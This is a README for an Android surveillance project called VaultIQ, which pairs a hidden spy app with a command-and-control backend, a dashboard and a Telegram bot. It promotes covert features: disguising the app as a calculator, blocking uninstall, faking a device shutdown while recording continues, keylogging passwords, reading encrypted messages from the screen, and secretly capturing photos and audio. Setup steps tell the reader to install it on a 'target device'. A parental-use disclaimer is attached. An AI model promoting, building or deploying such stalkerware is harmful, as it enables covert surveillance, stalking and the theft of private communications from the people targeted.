# 🛡️ VaultIQ - Next-Gen Android Monitoring & Stealth Control System

VaultIQ is a comprehensive, enterprise-grade Android surveillance and remote management solution. Built with a focus on **persistence, stealth, and real-time control**, it leverages the power of Supabase and modern Android architecture to provide a seamless monitoring experience across Web, Mobile, and Telegram interfaces.

---

## 🏗️ System Architecture
The project is built on a **Centralized Command & Control (C2)** architecture.

```text
[ Target Device ] <---> [ Supabase Backend ] <---> [ Admin Interfaces ]
  (spy-app)             (PostgreSQL/Realtime)       (Web/Bot/Control-App)
```

### 📁 Module Breakdown
*   **[🚀 spy-app](./spy-app)**: The core Android engine. Features include parallel data syncing, adaptive battery usage, and deep accessibility-based extraction.
*   **[📱 control-app](./control-app)**: A native Android application for administrators. It provides a mobile-optimized UI to view target data and send instant commands.
*   **[🤖 tele-bot](./tele-bot)**: A Python-powered Telegram "Master Controller". Manage your entire fleet of devices directly from Telegram using rich button menus.
*   **[🖥️ dashboard](./dashboard)**: A professional web-based analysis tool. Includes real-time behavior timelines, GPS maps, and advanced data filtering.
*   **[🗄️ backend](./backend)**: Contains the full SQL schema, Row Level Security (RLS) policies, and automated database maintenance triggers.
*   **[🚫 porn-sites](./porn-sites)**: A massive database of **1.1 Million+ domains** used by the app to block restricted content in real-time.

---

## 🌟 Key Features

### 👻 Stealth & Persistence
*   **App Identity Morphing**: Remotely transform the app icon and name (e.g., into a "Calculator" or "Calendar").
*   **Anti-Uninstall Guard**: Monitors settings activity and blocks attempts to force-stop or uninstall the app.
*   **Exclude from Recents**: The app remains invisible in the Android task manager.
*   **Self-Healing Watchdog**: A persistent background mechanism that restarts services if they are killed by the OS or OEM battery savers.

### 🔍 Monitoring Capabilities
*   **Deep Message Extraction**: Captures encrypted chats from WhatsApp, Telegram, Signal, and Messenger by reading screen text.
*   **1.1M Domain Web Filter**: Real-time blocking of adult and restricted websites across all major Android browsers (Chrome, Firefox, etc.).
*   **Remote Media Capture**: Take front/back photos, screenshots, and ambient audio recordings on demand.
*   **Behavioral Timeline**: A chronological feed of calls, SMS, and app usage events.
*   **Keylogging & Clipboard**: Captures every keystroke (including passwords in non-secure fields) and clipboard updates.

### 🛡️ Defense & Control
*   **Fake Power-Off**: Displays a convincing fake shutdown animation. The screen goes black, but the device remains ON and monitoring.
*   **VPN & ADB Detection**: Alerts the admin if the target user attempts to hide their traffic or debug the device.
*   **Remote Lockdown**: Instant device locking or full factory data wipe via Device Admin privileges.
*   **Real-time Heartbeat**: 1-second precision status monitoring to know exactly when a device is online.

---

## 🛠️ Installation & Deployment

### 1. Backend Setup
1. Create a project at [Supabase](https://supabase.com).
2. Execute the SQL scripts found in `backend/policies/row-level-security.sql`.
3. Note your `SUPABASE_URL` and `SUPABASE_ANON_KEY`.

### 2. Telegram Bot (VPS)
1. Hosted ideally on a VPS (like Hetzner).
2. See the **[VPS Setup Guide](./tele-bot/setup_vps.md)** for step-by-step instructions.

### 3. Spy App Configuration
1. Update `spy-app/gradle.properties` with your API keys.
2. Build the signed APK in Android Studio.
3. Install on the target device and grant required permissions (Accessibility, Device Admin, etc.).

---

## 📚 Technical Documentation
*   [Feature Comparison Matrix](./ClevGuard_Feature_Comparison.md)
*   [Executive Management Dashboard Design](./stitch-design-system/executive_management_dashboard/DESIGN.md)
*   [Database Schema Details](./backend/policies/row-level-security.sql)

---

## ⚖️ Legal & Ethical Warning
VaultIQ is developed for **authorized parental monitoring and enterprise device management** only. The use of this software for unauthorized spying, data theft, or any illegal activity is strictly prohibited. The developers assume no liability for misuse of this tool.

---
**VaultIQ System - Build v1.0 (2026)**
"Total Visibility. Absolute Stealth."
